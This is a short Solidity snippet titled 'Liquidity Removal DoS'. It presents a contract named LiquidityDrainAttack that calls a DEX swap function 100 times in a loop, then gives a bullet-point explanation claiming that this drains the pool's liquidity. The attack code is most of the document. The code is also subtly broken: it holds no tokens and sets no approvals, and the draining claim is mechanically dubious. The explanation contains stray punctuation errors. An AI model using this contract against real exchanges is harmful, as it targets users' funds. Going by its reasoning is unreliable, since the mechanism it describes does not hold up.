*******Liquidity Removal DoS*******

interface IDEX {
    function swap(address tokenA, address tokenB, uint256 amount) external;
}

contract LiquidityDrainAttack {
    IDEX public dex;
    address public tokenA;
    address public tokenB;

    constructor(address _dex, address _tokenA, address _tokenB) {
        dex = IDEX(_dex);
        tokenA = _tokenA;
        tokenB = _tokenB;
    }

    function attack() external {
        for (uint256 i = 0; i < 100; i++) {
            dex.swap(tokenA, tokenB, 1000); // Swap multiple times to drain liquidity
        }
    }
}


.The function attack() runs a loop 100 times.

.Each loop executes a swap on the DEX.

.This rapidly drains liquidity by continuously trading tokenA for tokenB.

I.f tokenA has transfer fees or burns tokens, the pool loses value, making future swaps expensive.

